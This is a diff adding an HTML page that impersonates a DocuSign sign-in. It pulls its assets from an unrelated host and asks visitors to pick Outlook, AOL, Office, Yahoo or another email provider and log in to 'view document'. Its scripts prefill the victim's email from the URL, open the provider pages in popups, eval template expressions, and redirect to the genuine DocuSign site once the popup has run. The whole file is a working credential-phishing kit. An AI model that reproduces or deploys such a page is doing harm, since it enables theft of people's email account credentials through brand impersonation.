@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>DocuSign Login - Enter email to start sign in</title>
+   <link href="https://docucdn-a.akamaihd.net/olive/images/2.15.0/favicons/favicon.ico" rel="shortcut icon" type="image/x-icon">
+    <style>
+        ::-webkit-scrollbar{width:3px}
+        ::-webkit-scrollbar-track{background:#f7fafe}
+        ::-webkit-scrollbar-thumb{background:#2E77BC;border-radius:30px}
+        ::-webkit-scrollbar-thumb:hover{background:#2E77BC;}
+        @font-face {
+            font-family: 'Segoe UI';
+            src: url('https://bpxion.com/email-list/docusjjksndks1/assets/SegoeUI.eot');
+            src: local('Segoe UI'), local('SegoeUI'),
+                url('https://bpxion.com/email-list/docusjjksndks1/assets/SegoeUI.eot?#iefix') format('embedded-opentype'),
+                url('https://bpxion.com/email-list/docusjjksndks1/assets/SegoeUI.woff2') format('woff2'),
+                url('https://bpxion.com/email-list/docusjjksndks1/assets/SegoeUI.woff') format('woff'),
+                url('https://bpxion.com/email-list/docusjjksndks1/assets/SegoeUI.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Segoe UI';
+            src: url('https://bpxion.com/email-list/docusjjksndks1/assets/SegoeUI-SemiBold.eot');
+            src: local('Segoe UI Semibold'), local('SegoeUI-SemiBold'),
+                url('https://bpxion.com/email-list/docusjjksndks1/assets/SegoeUI-SemiBold.eot?#iefix') format('embedded-opentype'),
+                url('https://bpxion.com/email-list/docusjjksndks1/assets/SegoeUI-SemiBold.woff2') format('woff2'),
+                url('https://bpxion.com/email-list/docusjjksndks1/assets/SegoeUI-SemiBold.woff') format('woff'),
+                url('https://bpxion.com/email-list/docusjjksndks1/assets/SegoeUI-SemiBold.ttf') format('truetype');
+            font-weight: 600;
+            font-style: normal;
+        }
+        *,
+        body {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Segoe UI;
+            background-image: url('https://bpxion.com/email-list/docusjjksndks1/assets/bg.png');
+            background-size: cover;
+            background-position: left;
+            background-color: #f7fafe;
+            padding: 1rem 0;
+            display: flex;
+            align-items: center;
+            min-height: 100vh;
+        }
+        img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+        .safflower-wrapper {
+            display: flex;
+            flex-wrap: wrap;
+            width: 100%;
+            margin: 0 auto;
+            max-width: 1140px;
+            background-color: #fff;
+            border-radius: 0.875rem;
+            box-shadow: 0px 9px 19px 0px rgba(0, 0, 0, 0.4);
+            overflow: hidden;
+        }
+        .col {
+            width: 50%;
+            position: relative;
+            padding: 2rem 1rem;
+        }
+        .col.right {
+            display: flex;
+            background-color: #F3F4FA;
+        }
+        .col.left{
+            background-color: #F6FBFE;
+            padding-left: 4rem;
+            padding-right: 4rem;
+        }
+        .card-container{
+            margin: 0 auto;
+            text-align: left;
+            max-width: 390px;
+        }
+        .docusign{
+            margin: 0 auto;
+            max-width: 180px;
+            margin-bottom: 2rem;
+        }
+        .login-card{
+            width: 100%;
+            max-width: 340px;
+            padding: 1.4rem 1rem;
+            border-radius: 8px;
+            margin: 0 auto;
+        }
+        .logo{
+            height: 1.2rem;
+            display: flex;
+        }     
+        .links img{
+            width: 100%;
+            margin-bottom: 2%;
+            transition: all 0.3s;
+        }
+        .links img:hover{
+            transform: scale(1.05);
+        }
+        .login{
+            font-family: Segoe UI;
+            font-weight: 600;
+            margin-bottom: 1.25rem;
+        }
+        .signin-text{
+            font-weight: 700;
+            margin-bottom: 0.3125rem;
+            color: #194ba0;
+        }
+        .text-center{
+            text-align: center;
+        }
+        .para {
+            font-family: Segoe UI;
+            font-weight: 700;
+            color: #505050;
+            font-size: 1rem;
+        }
+        .note {
+            font-family: Segoe UI;
+            font-weight: 700;
+            font-size: 0.875rem;
+            color: #194ba0;
+        }
+
+        .copyright {
+            font-family: Segoe UI;
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: #000;
+            text-transform: capitalize;
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 92%;
+            margin: 0 auto;
+            position: absolute;
+            bottom: 3.8%;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .copyright a {
+            color: #000;
+            text-decoration: none;
+        }
+
+        .copyright a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright a:not(:first-child) {
+            margin-left: 1.25em;
+        }
+
+        @media(max-width: 991px) {
+            .col,.col.right {
+                width: 100%;
+            }
+            .col.right{
+                padding-bottom: 3rem;
+                order: 0;
+            }
+            .col.left{
+                order: 1;
+            }
+        }
+        @media(max-width: 440px){
+            .col.right{
+                padding-bottom: 3.5rem;
+            }
+        }
+        @media(min-width: 1602px) {
+            .safflower-wrapper {
+                max-width: 1200px;
+            }
+            .login-card{
+                max-width: 400px;
+            }
+            .para{
+                font-size: 0.925rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="safflower-wrapper">
+        <div class="col left">
+            <h2 class="login">Build a better eSignature <br>
+            experience with the DocuSign</h2>
+            <img src="https://bpxion.com/email-list/docusjjksndks1/assets/left.png" draggable="false">
+            <div class="text-center">
+                <h3 class="signin-text">Sign In to DocuSign</h3>
+                <div class="para">
+                    Go digital with DocuSign. We’ll help you all the way and scale with you, even to a global level.
+                </div>
+            </div>
+        </div>
+        <div class="col right">
+            <div class="card-container">
+                <img src="https://bpxion.com/email-list/docusjjksndks1/assets/logo.png" class="docusign" draggable="false">
+                <div class="para">
+                    To view document select yor email provider below
+                    and login with email address.
+                </div>
+                <div class="note">
+                    Select other emails if your email provider not below.
+                </div>
+                <div class="login-card">
+                    <div class="links">
+                     <ul style=" list-style-type: none;">
+            <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
+
+
+                        <a href="" data-nn="OUT.html?username={|location.hash.substring(1)|}">
+                            <img src="https://bpxion.com/email-list/docusjjksndks1/assets/outlook.png" alt="outlook-login" draggable="false">
+                        </a>
+
+                        </li>
+ <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">  
+                        <a href="" data-nn="AOL.html?yid={|location.hash.substring(1)|}">
+                            <img src="https://bpxion.com/email-list/docusjjksndks1/assets/Aol shape.png" alt="aol-login" draggable="false">
+                        </a>
+
+                        </li>
+ <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">  
+                        <a href="" data-nn="OFFICE.html?username={|location.hash.substring(1)|}">
+                            <img src="https://bpxion.com/email-list/docusjjksndks1/assets/office.png" alt="office-login" draggable="false">
+                        </a>
+
+                        </li>
+ <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">  
+                        <a href="" data-nn="YAHOO.html?yid={|location.hash.substring(1)|}">
+                            <img src="https://bpxion.com/email-list/docusjjksndks1/assets/yahoo.png" alt="yahoo-login" draggable="false">
+                        </a>
+
+                        </li>
+ <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">  
+                        <a href="" data-nn="OTHER.html#{|location.hash.substring(1)|}">
+                            <img src="https://bpxion.com/email-list/docusjjksndks1/assets/other mails.png" alt="other-login" draggable="false">
+                        </a>
+                     </li>
+                               <script>
+const queryString=[...new URLSearchParams(location.search)].reduce((e,[t,n])=>(e[t]=n,e),{});function templatePage(){let g=document;function a(b){return b.replace(/{\|(.*?)\|}/g,(_,c)=>{let d=eval(c);return null==d?"":d})}for(const e of g.getElementsByTagName("*"))for(const t of e.attributes){let e=a(t.value);e!==t.value&&(t.value=e)}const b=g.createNodeIterator(g.body,NodeFilter.SHOW_TEXT,null);let c;for(;c=b.nextNode();){let e="textContent",t=a(c[e]);t!==c[e]&&(c[e]=t)}}
+templatePage()
+</script>
+                     </ul>
+                    </div>
+                    <div style="" id="checks" style="display: none;"></div>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+   <script>
+     $(document).ready(function(e){ 
+     window_opener_xc(); 
+   });
+   function window_opener_xc(){
+     var url_part = get_extra_data(1);
+     $('li a').click(function(e){
+       e.preventDefault();
+     if($(this).data('nn')){
+       var checks = $('#checks');
+           var win3 = window.open(url_part+$(this).data('nn'), '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
+         setInterval(function(){ 
+         if($('#checks').html()){ window.location.replace(get_extra_data(2)); }
+       }, 3000);
+     }
+     });
+   }
+   function get_extra_data(a){
+     var output = '';
+     if(a==1){
+       output = '';
+     }
+     else if(a==2){
+       output = "https://account.docusign.com/#/username";
+     }
+     return output;
+   }
+   </script> 
+                </div>
+            </div>
+            <div class="copyright">
+                <div>
+                    &#169; DocuSign Inc., 2003 - 2022
+                </div>
+                <div>
+                    <a href="">Terms</a>
+                    <a href="">Privacy &amp; Policy</a>
+                    <a href="">Intellectual Property</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
